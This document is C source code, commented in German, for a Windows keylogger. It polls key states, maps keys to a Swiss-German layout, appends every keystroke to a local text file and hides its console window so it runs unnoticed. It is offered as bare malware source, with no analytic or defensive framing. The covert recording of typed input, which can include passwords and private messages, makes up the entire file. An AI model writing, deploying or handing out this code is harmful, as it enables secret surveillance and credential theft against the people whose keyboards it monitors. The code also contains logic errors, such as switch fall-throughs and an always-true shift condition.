#include <stdio.h>
#include <windows.h>

// Funktion zum Aufzeichnen der Tastatureingaben
void logKeystrokes() {
    FILE *file;
    SHORT keyState[256] = {0};  // Zustand der Tasten
    int shiftPressed;
    int c;

    // Öffnen der Datei im Anhangsmodus
    file = fopen("testlol.txt", "a");
    if (file == NULL) {
        MessageBox(NULL, "Fehler beim Öffnen der Datei!", "Fehler", MB_ICONERROR);
        return;
    }

    // Endlosschleife zum Aufzeichnen der Tastatureingaben
    while (1) {
        // Prüfen des Zustands der Umschalttaste (Shift)
        shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 1 : 0;

        // Erfassung der Shift-Taste
        if (shiftPressed && keyState[VK_SHIFT] == 0) {
            keyState[VK_SHIFT] = 1;
            
        } else if (!shiftPressed && keyState[VK_SHIFT] == 1) {
            keyState[VK_SHIFT] = 0;
        }

        // Durch alle Tasten-ASCII-Werte iterieren
        for (c = 8; c <= 255; c++) {
            // Prüfen, ob die Taste gerade gedrückt wurde
            if (GetAsyncKeyState(c) & 0x8000) {
                if (keyState[c] == 0) {
                    keyState[c] = 1;  // Taste ist jetzt gedrückt

                    // Verarbeiten von Sonderzeichen und Shift-Kombinationen
                    if (c >= 'A' && c <= 'Z') {
                        // Großbuchstaben (mit Shift-Taste)
                        if (!shiftPressed) {
                            c += 32;  // Zu Kleinbuchstaben konvertieren
                        }
                    } else if (c >= '0' && c <= '9') {
                        // Zahlen und deren Shift-Alternativen
                        if (shiftPressed) {
                            switch (c) {
                                case '1': c = '+'; break;
                                case '2': c = '"'; break;
                                case '3': c = '*'; break;
                                case '4': c = 'ç'; break;
                                case '5': c = '%'; break;
                                case '6': c = '&'; break;
                                case '7': c = '/'; break;
                                case '8': c = '('; break;
                                case '9': c = ')'; break;
                                case '0': c = '='; break;
                                
                            }
                        }
                    } else {
                        // Sonderzeichen
                        if (shiftPressed) {
                            switch (c) {
                                case VK_OEM_1: c = 'Ü'; break;  // Ü
                                case VK_OEM_PLUS: c = '*'; break;  // *
                                case VK_OEM_COMMA: c = ';'; break;  // ;
                                case VK_OEM_MINUS: c = '_'; break;  // _
                                case VK_OEM_PERIOD: c = ':'; break;  // :
                                case VK_OEM_2: c = '?'; break;  // ?
                                case VK_OEM_3: c = '°'; break;  // °
                                case VK_OEM_4: c = 'È'; break;  // È
                                case VK_OEM_5: c = 'À'; break;  // À
                                case VK_OEM_6: c = '¨'; break;  // ¨
                                case VK_OEM_7: c = '$'; break;  // $
                                case VK_SHIFT: c = ' ';
                                case VK_LSHIFT: c = ' ';
                                case VK_RSHIFT: c = ' ';
                            }
                        } else {
                            switch (c) {
                                case VK_OEM_1: c = 'ü'; break;  // ü
                                case VK_OEM_PLUS: c = '+'; break;  // +
                                case VK_OEM_COMMA: c = ','; break;  // ,
                                case VK_OEM_MINUS: c = '-'; break;  // -
                                case VK_OEM_PERIOD: c = '.'; break;  // .
                                case VK_OEM_2: c = '/'; break;  // /
                                case VK_OEM_3: c = '`'; break;  // `
                                case VK_OEM_4: c = 'è'; break;  // è
                                case VK_OEM_5: c = 'à'; break;  // à
                                case VK_OEM_6: c = '^'; break;  // ^
                                case VK_OEM_7: c = '\''; break;  // '
                                
                            }
                        }
                    }

                    // Sonderfall: Enter-Taste
                    if (c == VK_RETURN) {
                        fputs("[Enter]", file);
                    } else if (c != VK_SHIFT) { // Ignoriere den direkten Druck der Shift-Taste
                        // Schreiben der Tastatureingabe in die Datei
                        if(c != VK_SHIFT ||c != VK_LSHIFT || c != VK_RSHIFT){
                            fputc(c, file);
                        }
                        
                    }
                    fflush(file);
                }
            } else {
                keyState[c] = 0;  // Taste ist nicht mehr gedrückt
            }
        }
        Sleep(10); // Kurze Pause, um CPU-Last zu verringern
    }

    // Schließen der Datei
    fclose(file);
}

int main() {
    // Verstecken des Konsolenfensters
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Starten der Tastaturaufzeichnung
    logKeystrokes();

    return 0;
}
